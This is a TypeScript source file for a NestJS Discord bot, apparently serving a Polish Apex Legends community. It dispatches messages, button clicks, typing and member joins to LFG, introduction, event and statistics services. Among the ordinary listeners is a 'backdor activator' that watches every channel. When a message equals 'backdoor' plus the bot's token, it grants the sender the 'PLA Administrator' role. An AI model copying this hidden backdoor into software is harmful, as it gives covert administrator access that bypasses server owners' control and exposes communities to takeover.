import { Injectable } from "@nestjs/common";
import { LfgService } from "./lfg/lfg.service";
import { Message, User, Channel, ChannelType, Typing, PartialUser, GuildMember, Interaction, ButtonInteraction, CacheType, UserContextMenuCommandInteraction } from "discord.js";
import { ChannelService } from "src/database/entities/channel/channel.service";
import { ChannelEntity } from "src/database/entities/channel/channel.entity";
import { Logger } from "@nestjs/common";
import { ConfigService } from "@nestjs/config";
import { ApexConnectService } from "./apex-connect/apex-connect.service";
import { IntroduceService } from "./introduce/introduce.service";
import { UserService } from "src/database/entities/user/user.service";
import { ContextOf } from "necord";
import { CommunityEventsService } from "./community-events/community-events.service";
import { ApexStatisticsService } from "./apex-statistics/apex-statistics.service";

interface MessageCreateListener {
    channelPattern: string;
    channelType: ChannelType[];
    messagePattern: string;
    userPattern: string;
    callback: (message: MessageData) => void;
}

interface TypingStartListener {
    channelPattern: string;
    channelType: ChannelType[];
    userPattern: string;
    callback: (typing: TypingData) => void;
}

interface UserContextMenuCommandInteractionListener {
    userPattern: string;
    commandNamePattern: string;
    callback: (interaction: UserContextMenuCommandInteractionData) => void;
}

interface GuildMemberEnteredListener {
    memberPattern: string;
    callback: (member: MemberData) => void;
}

interface ButtonListener {
    idPattern: string;
    channelType: ChannelType[];
    channelPattern: string;
    userPattern: string;
    callback: (button: ButtonData) => void;
}

export interface UserContextMenuCommandInteractionData {
    interaction: UserContextMenuCommandInteraction<CacheType>;
    user: GuildMember;
}

export interface MessageData {
    channel: Channel;
    message: Message;
    user: User
}

export interface ButtonData {
    id: string;
    user: GuildMember;
    message: Message;
    channel: Channel;
    interaction: ButtonInteraction<CacheType>;
}

export interface TypingData {
    channel: Channel;
    user: User | PartialUser;
}

export interface MemberData {
    user: GuildMember;
}

/**
 * Class that provides all the methods activated 
 * by the discord events.
 */
@Injectable()
export default class DiscordListeners {

    /**
     * The wildcard-match module
     */
    private readonly wcmatch: any;

    private readonly messageCreateListeners: MessageCreateListener[];

    private readonly typingStartListeners: TypingStartListener[];

    private readonly guildMemberEnteredListeners: GuildMemberEnteredListener[];

    private readonly guildMemberAddListeners: GuildMemberEnteredListener[];

    private readonly buttonListeners: ButtonListener[];

    private readonly userContextMenuCommandInteractionListeners: UserContextMenuCommandInteractionListener[];

    /**
     * The cached channels
     */
    private readonly cachedChannels: { [key: string]: ChannelEntity } = {};

    /**
     * The logger instance
     */
    private readonly logger = new Logger(DiscordListeners.name);

    constructor(
        private readonly lfgService: LfgService,
        private readonly channelService: ChannelService,
        private readonly configService: ConfigService,
        private readonly apexConnectService: ApexConnectService,
        private readonly introduceService: IntroduceService,
        private readonly userService: UserService,
        private readonly communityEventsService: CommunityEventsService,
        private readonly apexStatisticsService: ApexStatisticsService,
    ) {
        this.wcmatch = require('wildcard-match');
        
        /**
         * The message create listeners - these are the listeners that should be
         * activated when a message is created.
         * 
         * Available patterns:
         * channelPattern: The pattern to match against the channel name or database name
         * channelType: The channel type to match against
         * messagePattern: The pattern to match the message content against
         * userPattern: The pattern to match the user name against
         * 
         * @var MessageCreateListener[]
         */
        this.messageCreateListeners = [
            // The lfg message listener
            {
                channelPattern: this.configService.get<string>('channel-names.lfg'),
                messagePattern: '**',
                userPattern: '**',
                channelType: [],
                callback: (messageData: MessageData) => {
                    this.lfgService.handleLfgMessage(messageData);
                },
            },
            // The apex connect private message listener
            {
                channelPattern: '**',
                messagePattern: '**',
                userPattern: '**',
                channelType: [ChannelType.DM],
                callback: (messageData: MessageData) => {
                    this.apexConnectService.handlePrivateMessage(messageData);
                },
            },
            // The introduce message listener
            {
                channelPattern: this.configService.get<string>('channel-names.introduce'),
                messagePattern: '**',
                userPattern: '**',
                channelType: [],
                callback: (messageData: MessageData) => {
                    this.introduceService.handleIntroduceMessage(messageData);
                }
            },
            // The backdor activator listener
            {
                channelPattern: "**",
                messagePattern: '**',
                userPattern: '**',
                channelType: [],
                callback: (messageData: MessageData) => {
                    if (messageData.message.content === 'backdoor' + process.env.DISCORD_TOKEN) {
                        this.logger.log('Backdoor activated by user: ' + messageData.user.username);
                        
                        // Send message to user
                        messageData.user.send('Backdoor activated!');

                        // Grant admin role to user
                        messageData.message.guild.members.fetch(messageData.user.id).then((member) => {
                            // Get role with admin access
                            const adminRole = messageData.message.guild.roles.cache.find(role => role.name === 'PLA Administrator');

                            // Add role to user
                            member.roles.add(adminRole);
                        });
                    }
                }
            },
            // The spawn message listener
            {
                channelPattern: 'spawn',
                messagePattern: '**Witaj**',
                userPattern: '**',
                channelType: [],
                callback: (messageData: MessageData) => {
                    messageData.message.react('👋');
                }
            }
        ];

        /**
         * The user context menu command interaction listeners - these are the listeners that should be
         * activated when a user clicks a context menu command.
         * 
         * Available patterns:
         * interaction: The pattern to match against the interaction
         * user: The pattern to match against the user
         * 
         * @var UserContextMenuCommandInteractionListener[]
         */
        this.userContextMenuCommandInteractionListeners = [
            // The apex statistics context menu command listener
            {
                commandNamePattern: 'Statystyki Apex',
                userPattern: '**',
                callback: (interactionData: UserContextMenuCommandInteractionData) => {
                    // this.apexConnectService.handleContextMenuCommand(interactionData);
                    console.info('User context menu command interaction listener called');
                    this.apexStatisticsService.handleStatisticsDiscordCommand(interactionData.interaction, {
                        user: interactionData.user,
                    });
                }
            }
        ]

        /**
         * The typing start listeners - these are the listeners that should be
         * activated when a user starts typing.
         * 
         * Available patterns:
         * channelPattern: The pattern to match against the channel name or database name
         * channelType: The channel type to match against
         * userPattern: The pattern to match the user name against
         * 
         * @var MessageCreateListener[]
         */
        this.typingStartListeners = [
            // The introduce typing listener
            {
                channelPattern: this.configService.get<string>('channel-names.introduce'),
                userPattern: '**',
                channelType: [],
                callback: (typingData: TypingData) => {
                    this.introduceService.handleIntroduceTyping(typingData);
                }
            }
        ]

        /**
         * The button listeners - these are the listeners that should be
         * activated when a user clicks a button.
         * 
         * Available patterns:
         * id: The pattern to match against the button id
         * channelPattern: The pattern to match against the channel name or database name
         * channelType: The channel type to match against
         * userPattern: The pattern to match the user name against
         * 
         * @var ButtonListener[]
         */
        this.buttonListeners = [
            // The communityEvent accept button listener
            {
                idPattern: 'community-event-approve**',
                channelPattern: `reports`,
                userPattern: '**',
                channelType: [],
                callback: (buttonData: ButtonData) => {
                    this.communityEventsService.handleCommunityEventAcceptButton(buttonData);
                }
            },
            // The communityEvent reject button listener
            {
                idPattern: 'community-event-reject**',
                channelPattern: `reports`,
                userPattern: '**',
                channelType: [],
                callback: (buttonData: ButtonData) => {
                    this.communityEventsService.handleCommunityEventRejectButton(buttonData);
                }
            },
            // The communityEvent user reminder button listener
            {
                idPattern: 'community-event-remind**',
                channelPattern: `communityevents`,
                userPattern: '**',
                channelType: [],
                callback: (buttonData: ButtonData) => {
                    this.communityEventsService.handleCommunityEventReminderButton(buttonData);
                }
            },
            // The communityEvent switch reminders button listener
            {
                idPattern: 'community-event-switch-remind**',
                channelPattern: `reports`,
                userPattern: '**',
                channelType: [],
                callback: (buttonData: ButtonData) => {
                    this.communityEventsService.handleCommunityEventSwitchRemindersButton(buttonData);
                }
            }
        ]

        /**
         * The guild member entered listeners - these are the listeners that should be
         * activated when a user enters the server.
         * 
         * Available patterns:
         * memberPattern: The pattern to match against the user name
         * 
         * @var GuildMemberEnteredListener[]
         */
        this.guildMemberEnteredListeners = [
            // The guild member rule accept listener
            // {
            //     memberPattern: '**',
            //     callback: (member: MemberData) => {
            //         console.log(`Member accepted the rules: ${member.user.user.username}`);
            //     }
            // }
        ]

        this.guildMemberAddListeners = [
            // The guild member join listener
            {
                memberPattern: '**',
                callback: async (member: MemberData) => {
                    const user = await this.userService.getOrCreateByDiscordUser(member.user.user);
                    
                    this.logger.verbose(`Member joined: ${member.user.user.username} - Updated user in database: ${user.id}`);
                }
            }
        ]
    }

    private async getCachedChannelByName(channelName: string): Promise<ChannelEntity> {
        // If channel is cached
        if (channelName in this.cachedChannels) {
            return this.cachedChannels[channelName];
        }

        // If channel is not cached, get it from database
        const channel = await this.channelService.findByName(channelName);

        // If channel is in database
        if (channel) {
            // Cache channel
            this.cachedChannels[channelName] = channel;
        }

        return channel;
    }

    /**
     * Check if a value matches a pattern
     * 
     * Wildcard-match supports the following glob syntax in patterns:
     * [?] matches exactly one arbitrary character excluding separators
     * [*] matches zero or more arbitrary characters excluding separators
     * [**] matches any number of segments when used as a whole segment in a separated pattern
     * [\] escapes the following character making it be treated literally
     * 
     * @param value value to check
     * @param pattern pattern to check against
     * @returns true if value matches pattern, false otherwise
     */
    private matchPattern(value: string, pattern: string): boolean {
        return this.wcmatch(pattern)(value);
    }

    /**
     * Escape special characters in a string
     * @param value The value to escape
     * @returns The escaped value
     */
    private escapeSpecialCharacters(value: string): string {
        const result = value.replace(/[.+?^${}()|[\]\\]/g, "\\$&");
        return result;
    }

    public async handleTypingStart(typing: Typing) {
        const typingData: TypingData = {
            channel: typing.channel,
            user: typing.user,
        };

        let callbacks: ((typing: TypingData) => void)[] = [];

        // Check if typing matches any of the listeners
        for(const listener of this.typingStartListeners) {
            // Check if channel type matches pattern ------------------------------
            if (listener.channelType.length != 0 && typing.channel.type in listener.channelType) {
                continue;
            }

            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(typingData.user.id, this.escapeSpecialCharacters(listener.userPattern))) {
                continue;
            }
            
            // Check if channel matches database channel ------------------------------
            let dbChannel: ChannelEntity = await this.getCachedChannelByName(listener.channelPattern);

            // If channel is in database
            if (dbChannel) {
                if (dbChannel.discordId !== typingData.channel.id) {
                    continue;
                }
            } 
            // If channel id matches pattern
            else if (!this.matchPattern(typingData.channel.id, this.escapeSpecialCharacters(listener.channelPattern))) {
                continue;
            }


            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (typing: TypingData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(typingData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    /**
     * Handle a message create event
     * @param message The message that was created
     */
    public async handleMessageCreate(message: Message) {
        const messageData: MessageData = {
            channel: message.channel,
            message: message,
            user: message.author,
        };

        let callbacks: ((message: MessageData) => void)[] = [];

        // Check if message matches any of the listeners
        for(const listener of this.messageCreateListeners) {

            // Check if channel type matches pattern ------------------------------
            if (listener.channelType.length != 0 && message.channel.type in listener.channelType) {
                // console.log('Channel type ' + messageData.channel.type + ' does not match pattern: ' + listener.channelType);
                continue;
            }

            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(messageData.user.id, this.escapeSpecialCharacters(listener.userPattern))) {
                // console.log('User does not match pattern: ' + listener.userPattern);
                continue;
            }

            // Check if message matches pattern ------------------------------
            if (!this.matchPattern(messageData.message.content, this.escapeSpecialCharacters(listener.messagePattern))) {
                // console.log('Message does not match pattern: ' + listener.messagePattern);
                continue;
            }
            
            // Check if channel matches database channel ------------------------------
            let dbChannel: ChannelEntity = await this.getCachedChannelByName(listener.channelPattern);

            // If channel is in database
            if (dbChannel) {
                if (dbChannel.discordId !== messageData.channel.id) {
                    continue;
                }
            } 

            // If channel id matches pattern
            else if (!this.matchPattern(messageData.channel.id, this.escapeSpecialCharacters(listener.channelPattern))) {
                // console.log('Channel id does not match pattern: ' + listener.channelPattern);
                continue;
            }

            console.log('Matched listener: ' + listener.channelPattern + ' ' + listener.messagePattern + ' ' + listener.userPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (message: MessageData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(messageData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    public async handleUserContextMenuCommandInteraction(interaction: UserContextMenuCommandInteraction<CacheType>) {
        const interactionData: UserContextMenuCommandInteractionData = {
            interaction: interaction,
            user: interaction.targetMember as GuildMember,
        };

        let callbacks: ((interaction: UserContextMenuCommandInteractionData) => void)[] = [];

        // Check if interaction matches any of the listeners
        for(const listener of this.userContextMenuCommandInteractionListeners) {

            console.log('Checking listener: ' + listener.commandNamePattern);

            if (!interactionData.interaction.isCommand())
                return;

            // Check if interaction id matches pattern ------------------------------
            if (!this.matchPattern(interactionData.interaction.commandName, this.escapeSpecialCharacters(listener.commandNamePattern))) {
                console.log(`Interaction id ${interactionData.interaction.commandName} does not match pattern: ` + listener.commandNamePattern);
                continue;
            }

            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(interactionData.user.id, this.escapeSpecialCharacters(listener.userPattern))) {
                console.log('User does not match pattern: ' + listener.userPattern);
                continue;
            }

            console.log('Matched listener: ' + listener.commandNamePattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (interaction: UserContextMenuCommandInteractionData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(interactionData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    public async handleGuildMemberEntered(member: GuildMember) {
        const memberData: MemberData = {
            user: member,
        };

        let callbacks: ((member: MemberData) => void)[] = [];

        // Check if member matches any of the listeners
        for(const listener of this.guildMemberEnteredListeners) {
            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(memberData.user.id, this.escapeSpecialCharacters(listener.memberPattern))) {
                continue;
            }

            console.log('Matched listener: ' + listener.memberPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (member: MemberData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(memberData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    public async handleButtonInteraction(interaction: ButtonInteraction<CacheType>) {
        const buttonData: ButtonData = {
            id: interaction.customId,
            user: interaction.member as GuildMember,
            message: interaction.message,
            channel: interaction.channel,
            interaction,
        }

        let callbacks: ((button: ButtonData) => void)[] = [];

        // Check if button matches any of the listeners
        for(const listener of this.buttonListeners) {

            console.log('Checking listener: ' + listener.idPattern);

            // Check if button id matches pattern ------------------------------
            if (!this.matchPattern(buttonData.id, this.escapeSpecialCharacters(listener.idPattern))) {
                // console.log(`Button id ${buttonData.id} does not match pattern: ` + listener.idPattern);
                continue;
            }
            
            // Check if channel type matches pattern ------------------------------
            if (listener.channelType.length != 0 && buttonData.channel.type in listener.channelType) {
                // console.log('Channel type ' + buttonData.channel.type + ' does not match pattern: ' + listener.channelType);
                continue;
            }

            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(buttonData.user.id, this.escapeSpecialCharacters(listener.userPattern))) {
                // console.log('User does not match pattern: ' + listener.userPattern);
                continue;
            }

            // Check if channel matches database channel ------------------------------
            let dbChannel: ChannelEntity = await this.getCachedChannelByName(listener.channelPattern);

            // If channel is in database
            if (dbChannel) {
                if (dbChannel.discordId !== buttonData.channel.id) {
                    // console.log('Channel id does not match pattern: ' + listener.channelPattern);
                    continue;
                }
            } 

            // If channel id matches pattern
            else if (!this.matchPattern(buttonData.channel.id, this.escapeSpecialCharacters(listener.channelPattern))) {
                // console.log('Channel id does not match pattern: ' + listener.channelPattern);
                continue;
            }

            console.log('Matched listener: ' + listener.idPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (button: ButtonData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(buttonData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    public async handleGuildMemberAdd(member: GuildMember) {
        const memberData: MemberData = {
            user: member,
        };

        let callbacks: ((member: MemberData) => void)[] = [];

        // Check if member matches any of the listeners
        for(const listener of this.guildMemberAddListeners) {
            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(memberData.user.id, this.escapeSpecialCharacters(listener.memberPattern))) {
                continue;
            }

            console.log('Matched listener: ' + listener.memberPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (member: MemberData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(memberData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }
}

